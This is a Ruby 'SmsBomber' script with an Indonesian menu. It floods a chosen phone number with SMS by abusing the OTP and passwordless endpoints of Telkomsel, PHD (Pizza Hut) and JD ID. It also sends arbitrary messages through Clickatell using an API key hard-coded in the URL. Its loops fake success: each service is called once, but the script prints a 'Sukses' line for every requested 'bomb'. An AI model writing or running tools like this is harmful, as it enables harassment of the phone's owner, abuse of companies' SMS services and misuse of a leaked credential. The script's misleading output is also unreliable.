#!/bin/ruby

require 'net/http'
require 'uri'

def target_()
 print "Nomor Target : "
 $target =gets.chomp
 print "Jumlah Bomb : "
 $jumlah = gets.chomp.to_i
end

#Telkomsel
def telkomsel(target)
 uri = URI.parse("https://tdwidm.telkomsel.com/passwordless/start")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
   "connection" => "sms",
   "phone_number" => "#{target}",
 )
 
 req_options = {
   use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
   http.request(request)
 end
end

#PHD
def phd(target)
 uri = URI.parse("https://www.phd.co.id/en/users/sendOTP")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
  "phone_number" => "#{target}",
 )
 
 req_options = {
  use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
 end
end


 #JD ID
 def jd(target)
 uri = URI.parse("http://sc.jd.id/phone/sendPhoneSms")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
  "phone" => "#{target}",
  "smsType" => "1",
 )
 
 req_options = {
  use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
 end
end

def clickatell(tujuan,pesan)
	uri = URI.parse("https://platform.clickatell.com/messages/http/send?apiKey=P0CDEoDGS4uLopH3VMT7pw==&to=#{tujuan}&content=#{pesan}")
    response = Net::HTTP.get_response(uri)
end

system("figlet SmsBomber")      


puts "---------------------------------------[ @zetc0de ]---------"

puts "-=[ Bomber Via? ]=-"
puts "1. Telkomsel [Khusus target nomor telkomsel] +62xxx"
puts "2. Pizza Hut"
puts "3. JD ID"
puts "4. SMS GRATIS"
puts
print "Pilih 1-4 : "
target_via = gets.chomp

case target_via
when "1"
	target_()
	telkomsel($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(3) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	 puts
	end

when "2"
	target_()
	phd($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(3) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	 puts
	end

when "3"
	target_()
	jd($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(3) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	 puts
	end

when "4"
	print "Tujuan : "
	$tujuan = gets.chomp
	print "Pesan : "
	$pesan = gets.chomp
	clickatell($tujuan,$pesan)	
	 puts "On Progress..."
	 sleep(3) 
	 puts "SMS ke-#{$tujuan} Sukses Boss!"


end


